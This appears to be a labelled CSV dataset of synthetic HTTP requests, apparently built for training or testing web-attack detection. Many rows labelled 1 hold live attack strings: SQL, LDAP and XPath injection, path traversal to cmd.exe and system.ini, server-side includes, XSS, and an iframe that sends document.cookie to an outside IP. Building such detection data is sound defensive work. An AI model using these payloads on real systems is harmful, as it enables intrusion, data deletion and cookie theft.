Method,URI,Host-Header,Host,Label,Data
GET,/iy8Q/eeudmfogE.tiff,HTTP/1.1,www.csnBx13t.cz:0,1,tqlejlttkewp=a%3A%5Cwindows%5Cboot.ini&ohrhghAf7=rZg&v8-qc=mhhfvadez4aa&snlwrgw3tU6rPSb=eunione
GET,/LrservicesO2Zw0hRCjW/h9jttV-k.JbTiW_SY/eS46zclk/ldlad3rn0eiikol9sh/Twghee5stvcetldsIreg/sj3K4VYhKG/wsERbPM.png,HTTP/1.1,www.hjqnU.it:136,0,et1iawUi3ins=hevisd8E&SNZS0m9C5Dftp=2m-FUb&2hRe=gGH%40yPdJv3U&aaivU0rldA=ohhc+nd&duemitpjtied=20593111
GET,/mtfY0@_/heQeval7Pg@optVOfcD/iijmehtseyyS4t/yRI8HqA73e.shtml,HTTP/1.0,146.52.115.235,1,0DgafljPEPYchild=79922654&ftf6AtaomroU=a&esagedR6=ciotandf0arcmdr%7Ed+Z%3C&taywteorn45=lae0Oso3ui&ilie=OR+++%27pInL%27++++IN++%28%27%27++%29&pbelikeOo=YmapmaocrespdQ&zk@u4O.UHCWx=dnishutdownutni0df%3DesjZca&4woI=tdw%26uUtun
GET,/lhh/0dr/sg93o/sumRB1/includeykKzn/oudgqSkkGdUxi/sAwget/td-7G-%uq.css,HTTP/1.1,www.darabI.st:76,0,ntsLgda=jloctRo4patuel&al=2071735727&1NHDYMtse=neu4&JwA4wnetcatQh=98&l7tinsertA1S.c=en&clKehnwHoeo=winntioet%3Dl
GET,/oaHb/1utohVmazkrysshsho5/sD/gSC_uLb3rPFPI/dzartplyyvabx/rieue/iuusniaocaotean2ziEt/dMGQ9S2nDYOrvHV3LYbt.pl,HTTP/1.1,218.177.128.202,1,ucoaaia=valog+drop
GET,/tahttlniefa/IHAvVftpJlbPY/hfv/seeth3/85h8cweM3vorw6F2qvyN/lmefnstRatj3/mtMaoEC/dS9yt7r3otonnh7dotr.aspx,HTTP/1.0,www.p9rhH.fr,1,0%uhnxg_68=e+stryiano&rnrqtntos8rdt=fa&roldqme7hp=jieiiOfJcapie&7rsofadmwP=txtr&5wxyauesrenf=dERIsDUiyfmz&ilg5eracatffsrf=0mtoen&biimjt9p=%29++++%28++++%7C++++%28displayName%3Dhad*%29+%28name++%3D+had*++%29%28mail%3Dhad*++%29&r0jieoutsteoo=oHL92m&ierafsdey=A6include&NcsyiNhpp=2&cnnamReaaw=92174&Nto=eume&OsuEew=pbg9&uotqAVCTsBaccess_log=+nielrie%5Bsns
GET,/pnie59eylcivT7/qyaaarslcdsassigoTcz/r5nqJruak/R5rD2winnt2AA/EWb7bgsoundaR3Kunion/nutdnmsm/mp/eurdFcnootS/5q-w/Rlaeesisna.php3,HTTP/1.0,182.146.133.108,1,s1ioop=yEkYTvJ&888SQk_nc1mB=tgnidwF+utha&wrotsHa=eNyYPMlCE&0ergnDea=3698&ecoa=9209&4iIfy3=920706&c422KE5uH4kV=r%40O&sEEcctqi=u%28includeatcTywherep%2B&Ca=ejeCK9V&wcdV=%3C%21--+++++%23include++virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22+++--%3E&omhdo=9885255943&hmhlygei6tajr=echo9nhaea&a5rct=240633&mc6uioilhgy3=O&u1id0ridsve=qWxaXK
GET,/..%5c../..%5c../..%5c../winnt/system32/cmd.exe,HTTP/1.1,www.mtj7o.uk,1,/c+dir
PUT,/xhttpsO/mHscriptbQatE/Fe-US86RlibrEiy/t8xnnrmlie/HQtD71NVboot.iniW2ysR/or1T@55988/nsDEvwWH88T-50AUrHYQ/h1cKWVZ7/5A1S5O.asmx,HTTP/1.0,www.ncee.uk,0,MxUwinntRbgsoundW3elrmN=scdtdegeoiec&peoiy=tdmhClog uiagt)muobjectnu&rtru3H=ndeSrroe&nisna=eOtsDlWLH@g&tn=6&nNlneaxrlsAadh=275038&tn25=492841591&xLbEQreplace.i6jP=36538477&ewfazavatoeun=Ce n
GET,/eErctnua/VLiju/Csffipisrplnsaedfs/mXKCUqLL/i2dahemh4iwmto/64oe/t7w.tiff,HTTP/1.1,www.lieed.be,0,e1Aons1tRbo=s02&entebih8e=38918&tRbt=791&yaeuAwm=65656680&KhppIIenph-7K=wnowh%3C2du%26&sEottlxbN9de=rUF2Rgw&rgoiLtdm0inwe=4&aEavitlenriwcp=nt1lt&esnA=uhQ&vrOihm1epeto97=ir+hrme
GET,/Se5gretsaanG5jE/hsOH39QQKRX0Dy4xl/EocopyN/ewdZgTpvj8-/eUeyZ6G-F1tP/qs6rgvsioe1nclstiHw/dmalEgShV.w@qNEyhv.dll,HTTP/1.0,www.yiSdeh.org,1,5c0ief=9il&7CNinput9uKeoGEo=r%7Exp_E&exjacm=%3Clink+rel+++%3D++%22++++stylesheet%22++++href+%3D++%22++++javascript%3A++++%5Balert+++%28%27Qwhs%27%29%3B%5D++%22+++%3E&60evalwgetCbinmML=Enhtpassltuatgng5linka&UKSW%uoq00=s%5C%5Cs%3CL%2F1spqin&4La9ps4xntW=agLioweojaxrero&siqkbieayesF3o=s-0Zgzux7FN&ewtttuarrnIs=ReeorrnD&ITmhvafcnin9r=deelpassthrueh1+a04nmochalnihu
GET,/_ixgQ@/77eoenmr/tdKKGmCxPzYlzsNhfDd/4aoojoi/206o/io.pl,HTTP/1.0,www.ctgter5.cz:42,1,p8home2=r+rs&ZiBrzh6l39=28+++++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++++%7C+++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++++or+++++768%3D&iydlsexavsde=08435760&hrsonlladlpn2T=48
GET,/1dachildu61stdinFeoA/6aWohwP0dnodePqy.mspx,HTTP/1.0,www.idrlDxTii.org,1,ssrnnnt7hy1mi5=iTl%27+++or+++1%3C+++++ehtHe%2Fwm1%2Fz%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D19%5D+or++%278ssyhott%27+%3D+++%27&dnrNuo0Iu40ur=%299bgsound7dn%3Cp4ef9s
PUT,/GE/S@exxp_PXtyTinacat/swOm59b4/lkjLpy_vE7W./d_.tiff,HTTP/1.0,184.136.175.218,0,2Dt8esmldetT=5Svr6Y7I&q9tmpaOv1dropLNsock_streamu=7555944&UaHgroup byPRftp.f5Sor=s9acW&co7iwdtpg1=656774
PUT,/nlT.b0SPMUjRIlGR6VVd/j@e_3ZmV2p/n2R27f4.sY5rv/e0P29OJL/iXB@BgF/OY/ahrfix9iBOQ.jpg,HTTP/1.1,97.254.155.100:80,1,5xVgX=\\\Nha&tctrddrm=..\\..\\..\\..\\..\\..\\..\\..\\..\\WINDOWS\\system.ini&shd=yOxxiX5y&eyAnJehtvbtk=65302215
GET,/oHkoiileIt.php,HTTP/1.0,www.rfodd.gov:2,1,ozrettt=etn&uaneNtrlLfia=ihtehm&mhg=te&ay2naEeezlPtjmo=het%7COtue%26ff%2Fde&SaoltTlasb=ynrrjek%28Vb7an&@1CHkVH=emailg&1Tdivbyd1=eohaxetpiasesi1&n3oitm=ye%2Fz&e5ro=7747359&wEnrshaHb=4542&sAowoht=pt%3Aa+Ao%3C2sE&qsmrltaaz=h+&teyeviet=ie&r0eh2=e5iisdchildea6&DHexectjr3255=e+nbefa
GET,/a0s/tdYN_OyIgAWCgPf@F/HU0ioThdirsr/6ZcopyAlSSVG/2T.SVy12jCUrr9c-v7L/FKS2/tv0MEUuW0c8yVWSNgkob/nfDZJEq_KkzxLRyV/waccept..js,HTTP/1.1,166.38.110.179:80,1,eh1oeBVhoue=osoc&a0asnairt=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&eeehmeieits=0357100&eakdtdt7ttsm=sDr2r8&4raruhehatAahl=nMYwOiRl
POST,/eHchthwPgE5jboGKa8/oze@8x4GqatlZ/eeeooaieaVhu2twiIht/nhmeatihb/4o_5dl/IYZW7R3rcpG/3.XXcGO.jpg,HTTP/1.1,112.227.181.141,1,styeunas=tlanddrenes+tdodbni&ixhdree=extaatYue&nuetspa='   OR     '1xo1seTu'    LIKE    'aze%25&Sea=nrc$&rrreCucg8= sock_streamatr=sth
POST,/et/ceuZUsrRxkRYzn1tije/aNo/lPT2nph-.jpg,HTTP/1.0,5.36.249.56,0,6xitieideaFsD=0gw4IG&aeat=1394805033&hH-iEYp=8551818085&i0icpr8wen2=Gk&prj=Smqr2oanizrsoehn&eos=cOFDRWcM&mnltgk7ms=1ih&autoexecz-vGlreplaceK=5044&a7tleEheu=o&gorogipt9=6h4so6ls&to=157159&0LNbe9Ats6=fsojeaU&98rnlttoWiw=u;wtvcrs>t oy-ii$a
GET,/olN3pafe@q7r/n9ltkeMsiHyr/UqGBF.pl,HTTP/1.0,www.pngrmepr.cz,0,_W5emKRDZl=r&YNUVbg=lUp9Xgn&c8ypbaeThoi9dp=tsyscutarehgdc5N96&at7=25256&nmfe=j3IeDuTZm&aGzas=pnDneenpdulo&jys6smIw=rs&hn=m%28s-8+ori&veaaoeccz=insertnhaving%22o%22+%26dtelnetaP%5Dlikehbt&ha=156&eggsnnSbac=97990696&desteloto=17&rrhr8cndme=ih05%40Ek9
GET,/npe/n3HEe9GOdILjMWCBcZY/hrsrsXwrmxkEh/3340BJV/nZ.mreplaceuT/accepty6./ieX-Y8-zvIUHpab.html,HTTP/1.1,www.aoQo8dt.be,1,oonfBxht=dphi6khna1itm&gehtminbirtrhIc=Br%29%28+++%7C+%28Ozwo2%3D*%29&wccaM3=956&ihmn7entmzagf8=84&hjdeboSeec=itoo&TzrSnem=egroup+byOoeio&kdZ-=8497507684&cdepa5tmartrLn=dCjG8QkiVj&oAea1vroo9asto=wh1ndiframeeieu&6dorxuwlqi=ni%7E%27as+&9tfhnd9ln8Cels=r4UW7bwoi&3eI63Ve6pndhrfr=25173&lrsZr6eBnidnve=tqta+entks&whacaedaeGtarlo=86
GET,/ahiIhn4nl/e2TP3jaovs3UuJ/hrtorertraut4eafhxh/TB/3icebrwteelata6sE/5@TK/hesc/8MDX95Wprocessing-instructionH3.i/okJgy/s%uO9FsQlsAM.sh,HTTP/1.0,www.aisrmon.net:16845,1,S7window.open2iGEY.l=vvtt04iatsnwy1&78tthtbkOwspm=ismHF%40s7esecsz&9YqstnDc4ajno=8en&zug=eeele&TttTEclRro2soe=2vj2oeAp&sta=ymhswin&BwAO2=+vhn&uiDb02iPyyMu=includees6o&ahb2poemf=smaSn&eiesio=965868&yfumlbitgtOext=iitesn%3A%5B+ms&eshaot=950750
GET,/inmd4/mKElI5F/hHnC-wuVdL69hr/pijaehqrl1sit/gctwu2usrGGinqhDI/ruelice/bui7wssmavaFdlEtaslu/z4lw@mgi1G9.htm,HTTP/1.1,www.uuaulI.cz,0,t8se1oftsoasore=dncrynihMirce&Es=d-hp%29&GUO@vQO=708&RbvonheTsqnlehr=t%22vsi+imgconnectn7ctcar+apS&w-F5s-=ecmcH3zztpx3&eueasM=system+8
PUT,/oVE2dcSmbO1bx/eiyHF9UocHedO_u/cE.WuULxmlspvbscriptI/tei/R5nmlu86eo2dasakCt/efNvSxW/ae8rao/m9a93x/c-mTicWRYjy_niGG_/tFwRnRuh_J.exe,HTTP/1.1,82.177.19.44,1,drjt=2lhrtreield0l&lldx=893&mPtrrpg=eTcticadus&hsizengelimcog=T&ealHiRtiCso=nt&Ddocumentl@eIFS=likeUnho&5wd7O3Iett=cstsehtdSo&1qXV9uBznrU=97640&hegedfTs=jwodnehae&HZEYy1.=61&f9m-7K=uousamt eeniio
GET,/9XT0ovAhHm/ctalwErhwEog9eijsm/lFjgaqisN7dM/UZnullOimgo2MGperllog/f@WgZ73X-p@nPqw/aqmriqoiepncsnNlO/yTbaetghopre/fQnP64PDIb-6rKG69Y/lwuaeseNi/oqZwcdLbFXsqMLmxZRXH/eJ0SpcmqGNs_bk6ZGk/vsAunFRHbq9n2PgCwm.asp,HTTP/1.0,www.uNx2ej.uk,1,agegCob=753&0IG5Ysw=6324&wfelim=pedleEtncay5&aineoyrt=%29+%28+++%7C%28wHtr%3DoeIez*%29&VYdTdQHDe=pwBIec&45boot.iniOttNftp=7115176878&ekop7d=4Cjn%5D&xml0zps=02667541&eiobhdsG4wET=934678615&7d_mWOO3KlogpsM=087105874&yzwriolpvi=+h3tem&ssmmtroiBych=0sw%3EIeiwuhomenit
GET,/..%u00255c..%u00255cwinnt/system32/cmd.exe,HTTP/1.1,108.101.163.253,1,/c+dir
GET,/connectVIE-childUH/ot@S2yBnjK91g3F/6u/8Z4bodyZ3_/gNOG_5CcuuL4/nWf/my/i1svcsEiun1decuha.css,HTTP/1.1,234.106.135.100,1,ut5tuaes5nyAx=%29+++%28++%7C+++%28+++cn%3D*o++%27brien*++++%29%28mail%3D*o%27brien*%29
GET,/aa/dheaitoedmtGeedem/ei4phosriw9r/Para0EeYee9iet/t@zi.dll,HTTP/1.1,www.giaa1tx.biz,1,nne6artips6e=+nas2&i7sjt=hG5uu7IRP&lmswm=m0os6pted&6T2i2Hs6a=rpHt%27+++++or+++++Pa4mjT%2Fpabsh%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D56%5D+++or++%27rzbF9%27%3D++++%27
GET,/rm/nuhj4ieqcnCbhd/zFJvWd04def/r-YUr.BHbpc/eFj/sqszGK_ktrSO3q/oxIZQ5/agC-nlY4c/tnnjppeednfrti.aspx,HTTP/1.0,www.hkfin.gov,0,zOhOdhe=rea%7C7%3CZrntlecho%27d
GET,/eiIvU8YADdWVwI/A4M/tfEQszaSj0/rxtgnaoeoqeasdgiei/KobjectZ.mspx,HTTP/1.0,www.taana.st,0,euh5s5=atelni&hhf=9248&Aeuu=%3BeotcsGescriptoo&06S@76KMcatUIF=f+hun&lsZkdFRDnhx=82876&oeooEapug9m4e=0g%26mdt%5B+etNe%3Aor&s05ir=tinputg%24htaccesandoomochaz%40window.opengg&efe=%26s&cnr=tpassthru&U8tnp=64239&hr=bo5%3Bx
GET,/rNV3ZdGpY2_/fw8weoUh/oOKRs.cgi,HTTP/1.1,63.216.5.182,0,RBEQetcYsqNX=dt-oa
POST,/lG@@kIPH6i9BkVBwC2/_AhttpsamKT/teetzellointntctl8/nvtimlmmWc/mD005544t3EhYJ5_p_T/oWpn725_fVvpV/gsDwPZ/mia/mWWhmGO@fu0VUH/hg/hkHY1UpBXu62yC/zrhhttya2alt.mdb,HTTP/1.1,www.hataSas.net,0,csstnisRt=2eincludeohin v6&kiSiu9teo=206372&I.gyxF=e2dVP@YI_en&re=so8Fs0ar&iTlthptlD= 6&eeintskby=ihn2&eaonneeortTe=6277009&lniarterreennhw=77
GET,/0amVstyle_W/na/erx2/D3bY0ZmXlinkinIyC.mdb,HTTP/1.0,www.en5t.cz:51828,1,e9olmuioat5b=mrAeA1yBnnqv2N&kbs5pelln=%3Ciframe+++src++%3D++%22+++vbscript%3A%5Bwindow.open%28%27http%3A%2F%2F22.248.207.1%2Fat.asmx%27%2Bdocument.cookie%29%3B%5D+++++%22++%3E
GET,/avaxlTWL_017/zS2475jiXZ6l/sZi4T/s80ZFKsz0N2nFBrNrvRa.html,HTTP/1.0,www.t2Rwhht8au.ch,1,aa3e7aiA0=ihttpstnlo%7Cpsidob&az9=duaae&leda5fIavmEqbe=++&Qo-G=569883&NQeXd=eeeo4eemtqse&samnc.inputV.hBZ=fte+oa%7Ekhes&abdfjelTitA2C=sGUNCNPVj5&tdttEhmsl4zc=yF9rh%3Dndr%7Cr&dgnRGs08hc2hC6i=a%27+dr&Rh=fDertnso7ts&0tTAaowte7IFn=..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&4s=q
PUT,/lA4bSrG0DOSO/lVvmtDGz5.shtml,HTTP/1.1,239.224.6.55:0,1,eOxglirqvNrOhs=n2=fr&uima=92&Jl74.cmeta=<!--#echo var='date_gmt'-->
POST,/BYiNXVXgBh.pl,HTTP/1.0,www.aPeg.com:80,1,tuRatlea9hdna=altylo2replacetqswIn&er9z2ossobarc=;&zgnck1tesi1dt1=tJn.QOj&ti6lqjioepu=7307684&d5rtdqcsrD8ro=gkfAiIGwnFl&anaik=92820000&NwhereOqmcatAYbWd=iZwfACt&dn8wI=s9o9dD@fOgKr&mt=aRMLxVe1lc&eroaohcn=CiPprfm0&cCr3h1IXj=7o
GET,/iI_mnK43dfGMSyaCH3./reccinMedcenme/ec/4x.asp,HTTP/1.1,198.192.157.40,0,neo6ktedslhrcnw=Uabeameta&Ocneei=i4ei7aemr4a
GET,/zdmTWg2vDdA/rFvoYiUUy536/emsyFIGAUw1oHyreeDSX/necrud1shD1g8v/iYlhczayW.Wn.dll,HTTP/1.0,21.235.230.54,0,SU2CTXsLdj=iojplz+iahcyrC
GET,/iLins1Iz_gm5E9x54/lfyaRdqosqOecuusaa2/HgylWNuDt.s/n_HYwfVDtiapjMdmNd/oIW/ea/hnhnescx7ddoewniuoe/x1VoptXBP9/_lEoSJG1ac/ysfrnfzshtmelngxme/7logdcmd4Y/o4a1tuekdnbeb.jpeg,HTTP/1.0,www.2ori1Utfp.net,1,rud=229.74.204.51++%7C++++dir&dtyswydjn4=rrNhttp7i%2F%7E0h%7E+emails4&Tentartzoot8r=lnAb9WIdZ54&VYXNdiv8ciZZWo=oe8uilAn4dtA&cliiu=elw.GzxiW&eoeenslnsr=84468
GET,/isHz/a4/wjgdn6glhLoiatDuAsoo/a9x.OTAZ27T2T5/jP.8YL/8OCZ-4Dsemsf.cgi,HTTP/1.0,www.iewdzi.be:80,1,etah5DasshatoxO=%29++++%28++%7C%28++++cn%3D*o%27brien*%29%28mail%3D*o+++%27brien*%29++++&232f=17954614&dooh6discttn=4340532&i3iOdcfrte0y=hlservicesebcS&iviuDie1daveyo=uwqCIz2Je%40&Mtkeh2co=sl9zu%7Eknrytk&2nlEecaaePrcxzy=5&xefjrta=y+vwhereue%27child%3E&ehitidbh5K=nVx4aW7ZF8&ntige3sdr=628&tonm=omTzeNqtrsi1
PUT,/eX1Hi-T/tI70Esad/v3allwinnt/skX2O./cz.tiff,HTTP/1.0,www.otwWmn.de:80,0,ee=uti3sus3oEahv65&eesscad=6dincludelL;0div  dr>$)6h&siamss=wi&hstda5m=etae1anevteuAns&9ht=0502
POST,/SV/Ae6teeo6teruDotsf/iaaGbajd.asp,HTTP/1.0,20.165.58.235,1,tsrhcq4a=24678&ep0isialihho='   );     delete     from  users;    commit;  dummy(  '&eefmadmgR=13903065
GET,/pe/nyjZze@-C_RN/ahF-/uJc1ZCOmiu1pvlEEpUt/ieGQ4b/iUgadatsetiobNip/it_g0v@jbkmGs/ntnnij/betweenC/yxI5kldZx7C3xd-Gm/Pmeta2dnodeesSA9passwd6.mdb,HTTP/1.0,www.d0knLoue0m.biz:80,1,nyB3aTeot9pk=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&blctlrlcawrlhaL=143&usjhr6q=0319136&ee2e3=83379&rrcrEpu=41852643&eTlc0tio5mSUnst=ss7
